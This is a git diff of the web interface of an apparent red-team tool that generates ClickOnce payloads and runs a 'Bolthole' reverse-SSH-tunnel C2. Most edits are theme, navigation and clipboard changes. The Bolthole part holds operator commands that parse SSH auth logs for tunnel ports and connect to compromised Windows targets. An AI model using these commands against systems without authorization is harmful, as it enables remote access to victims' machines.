@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ClickForClickOnce</title>
+<title>PwnyBolty</title>
 <script src="https://cdn.jsdelivr.net/npm/sortablejs@1.15.0/Sortable.min.js"></script>
 <style>
 /* ── Reset & base ── */
@@ -23,6 +23,20 @@
   --text2:    #7880a0;
   --radius:   8px;
 }
+[data-theme="light"] {
+  --bg:       #f0f2f8;
+  --surface:  #ffffff;
+  --surface2: #e8eaf4;
+  --border:   #c8ccde;
+  --accent:   #2a4db5;
+  --accent2:  #4a6ee0;
+  --green:    #1a8a4a;
+  --red:      #c0203d;
+  --amber:    #b07010;
+  --blue:     #2a6cc0;
+  --text:     #1a1f35;
+  --text2:    #5060a0;
+}
 html { font-size: 15px; }
 body {
   background: var(--bg);
@@ -39,7 +53,7 @@ body {
 .app { width: 100%; max-width: 860px; }
 
 /* ── Header ── */
-.app-header { text-align: center; margin-bottom: 36px; }
+.app-header { text-align: center; margin-bottom: 36px; position: relative; }
 .app-header .wordmark {
   font-size: clamp(1.4rem, 4vw, 2rem);
   font-weight: 700;
@@ -53,6 +67,9 @@ body {
   text-transform: uppercase;
   letter-spacing: 1.5px;
 }
+.header-actions { position: absolute; top: 0; right: 0; display: flex; gap: 6px; align-items: center; }
+.btn-icon { background: transparent; border: 1px solid var(--border); border-radius: var(--radius); padding: 6px 10px; color: var(--text2); cursor: pointer; font-size: .8rem; line-height: 1; transition: background .15s, color .15s; }
+.btn-icon:hover { background: var(--surface2); color: var(--text); }
 
 /* ── Tab bar ── */
 .tab-bar {
@@ -350,23 +367,23 @@ input[type=range]::-webkit-slider-thumb {
 
   <!-- Header -->
   <header class="app-header">
-    <div class="wordmark">&#x25C6; ClickForClickOnce</div>
+    <div class="wordmark">&#x25C6; PwnyBolty</div>
     <div class="tagline">Authorized Penetration Testing Payload Generator</div>
+    <div class="header-actions">
+      <button class="btn-icon" onclick="switchTab('history')" title="Build History">&#128196; History</button>
+      <button class="btn-icon" id="themeToggle" onclick="toggleTheme()" title="Toggle theme">&#9788;</button>
+    </div>
   </header>
 
   <!-- Tab bar -->
   <div class="tab-bar" role="tablist">
     <button class="tab-btn active" id="tab-cfco" onclick="switchTab('cfco')">
       <svg viewBox="0 0 16 16" fill="currentColor"><path d="M4 1h8a2 2 0 012 2v10a2 2 0 01-2 2H4a2 2 0 01-2-2V3a2 2 0 012-2zm0 1a1 1 0 00-1 1v10a1 1 0 001 1h8a1 1 0 001-1V3a1 1 0 00-1-1H4zm1 2h6v1H5V4zm0 2h6v1H5V6zm0 2h4v1H5V8z"/></svg>
-      <span>ClickOnce</span>
+      <span>ClickForClickOnce</span>
     </button>
     <button class="tab-btn" id="tab-bolthole" onclick="switchTab('bolthole')">
       <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zm-1 3v4h2V5H7zm0 5v1.5h2V10H7z"/></svg>
-      <span>Bolthole C2</span>
-    </button>
-    <button class="tab-btn" id="tab-history" onclick="switchTab('history')">
-      <svg viewBox="0 0 16 16" fill="currentColor"><path d="M8 1a7 7 0 100 14A7 7 0 008 1zm0 1a6 6 0 110 12A6 6 0 018 2zM7.5 4v4.25l3 1.5.5-.87-2.5-1.25V4H7.5z"/></svg>
-      <span>History</span>
+      <span>Bolthole</span>
     </button>
   </div>
 
@@ -581,6 +598,10 @@ input[type=range]::-webkit-slider-thumb {
     <!-- BH Step 2 -->
     <div class="bh-step" id="bh-step2">
 
+      <div style="margin-bottom:12px">
+        <button class="btn btn-ghost btn-sm" onclick="goToBhStep1()">&#8592; Back to C2 Config</button>
+      </div>
+
       <div class="section-card open" id="bh-id-card">
         <div class="section-header" onclick="toggleSection('bh-id-card')">
           <div class="step-badge">1</div>
@@ -750,6 +771,14 @@ input[type=range]::-webkit-slider-thumb {
 
 </div><!-- end .app -->
 
+<footer style="text-align:center;margin-top:32px;padding:16px;font-size:.75rem;color:var(--text2);line-height:1.9">
+  Based on
+  <a href="https://github.com/whokilleddb/clickforclickonce" target="_blank" rel="noopener" style="color:var(--accent2);text-decoration:none">ClickForClickOnce</a>
+  by whokilleddb &amp;
+  <a href="https://github.com/rvrsh3ll/Bolthole" target="_blank" rel="noopener" style="color:var(--accent2);text-decoration:none">Bolthole</a>
+  by rvrsh3ll
+</footer>
+
 <!-- ════════ BUILD LOG MODAL ════════ -->
 <div class="modal-backdrop hidden" id="logModal">
   <div class="modal">
@@ -775,6 +804,24 @@ input[type=range]::-webkit-slider-thumb {
 </div>
 
 <script>
+// ── Theme ──────────────────────────────────────────────────────────────────
+function toggleTheme() {
+  const html = document.documentElement;
+  const next = (html.dataset.theme === 'light') ? 'dark' : 'light';
+  html.dataset.theme = next;
+  localStorage.setItem('cfco-theme', next);
+  document.getElementById('themeToggle').innerHTML = next === 'light' ? '&#9790;' : '&#9788;';
+}
+(function initTheme() {
+  const t = localStorage.getItem('cfco-theme') || 'dark';
+  document.documentElement.dataset.theme = t;
+  // icon is set after DOM ready
+  document.addEventListener('DOMContentLoaded', () => {
+    const btn = document.getElementById('themeToggle');
+    if (btn) btn.innerHTML = t === 'light' ? '&#9790;' : '&#9788;';
+  });
+})();
+
 // ── State ──────────────────────────────────────────────────────────────────
 let actionCounter = 0;
 let _logPollTimer = null;
@@ -817,6 +864,8 @@ window.addEventListener('DOMContentLoaded', () => {
 function switchTab(tab) {
   ['cfco','bolthole','history'].forEach(t => {
     document.getElementById(t+'-tab').classList.toggle('active', t===tab);
+  });
+  ['cfco','bolthole'].forEach(t => {
     document.getElementById('tab-'+t).classList.toggle('active', t===tab);
   });
   if (tab === 'history') loadHistory();
@@ -914,10 +963,18 @@ function copyCmd(el) {
     }
   });
   text = text.trim();
-  navigator.clipboard.writeText(text).catch(() => {}).finally(() => {
+  const flashCopied = () => {
     el.classList.add('cmd-copied');
     setTimeout(() => el.classList.remove('cmd-copied'), 1100);
-  });
+  };
+  if (navigator.clipboard) {
+    navigator.clipboard.writeText(text).then(flashCopied, () => {});
+  } else {
+    const range = document.createRange();
+    range.selectNodeContents(el);
+    window.getSelection().removeAllRanges();
+    window.getSelection().addRange(range);
+  }
 }
 
 // ── Bolthole navigation ────────────────────────────────────────────────────
@@ -930,6 +987,13 @@ async function goToBhStep2() {
   document.getElementById('bh-dot-2').classList.add('active');
 }
 function showBhStep1() {
+  document.getElementById('bh-step2').classList.remove('active');
+  document.getElementById('bh-step1').classList.add('active');
+  document.getElementById('bh-dot-2').classList.remove('active');
+  document.getElementById('bh-dot-1').classList.remove('done');
+  document.getElementById('bh-dot-1').classList.add('active');
+}
+function goToBhStep1() {
   document.getElementById('bh-step2').classList.remove('active');
   document.getElementById('bh-step1').classList.add('active');
   document.getElementById('bh-dot-2').classList.remove('active');
@@ -1069,7 +1133,7 @@ echo "[+] Done. When a target connects, read the operator port from the C2 auth 
 echo "    journalctl -u ssh | grep 'Invalid user'"
 echo "    Format: Invalid user <win-user>.<machine>.p<PORT> from ..."
 echo "    The .p<PORT> suffix is the dynamic tunnel port — use it to connect:"
-echo "    ssh -i operator_key -p <PORT> $SSH_USER@localhost"
+echo "    ssh -i operator_key -p <PORT> <win-user>@localhost"
 `;
   const a = document.createElement('a');
   a.href = URL.createObjectURL(new Blob([script], {type:'text/plain'}));
@@ -1158,13 +1222,13 @@ function buildBoltholeOpsHtml(p) {
      <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Auth log format: Invalid user john.LAPTOP-ABC123.p31335 from 1.2.3.4 port 54321
 #                             └─ windows user ─┘ └─ port ─┘</span>
 
-journalctl -u ssh -n 100 | grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' | sort -u | sed 's/\\([^.]*\\)\\..*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'
+journalctl -u ssh -n 100 | grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' | sort -u | sed 's/\\(.*\\)\\.[^.]*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'
 <span class="cmd-comment"># older systems (auth.log):</span>
-grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' /var/log/auth.log | sort -u | sed 's/\\([^.]*\\)\\..*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'</div>
+grep -oP 'Invalid user \\K\\S+\\.\\S+\\.p\\d+(?= from)' /var/log/auth.log | sort -u | sed 's/\\(.*\\)\\.[^.]*\\.p\\([0-9]*\\)/ssh \\1@localhost -p \\2 -i operator_key/'</div>
    </div>
    <div class="ops-section">
      <div class="ops-label">2. Connect to target via reverse tunnel (run on C2)</div>
-     <div class="cmd-block" onclick="copyCmd(this)" title="Click to copy"><span class="cmd-comment"># Copy the SSH command printed by Step 1 and run it here.</span>
+     <div class="cmd-block"><span class="cmd-comment"># Copy the SSH command printed by Step 1 and run it here.</span>
 
 ssh &lt;win-user&gt;@localhost -p &lt;PORT&gt; -i operator_key</div>
    </div>
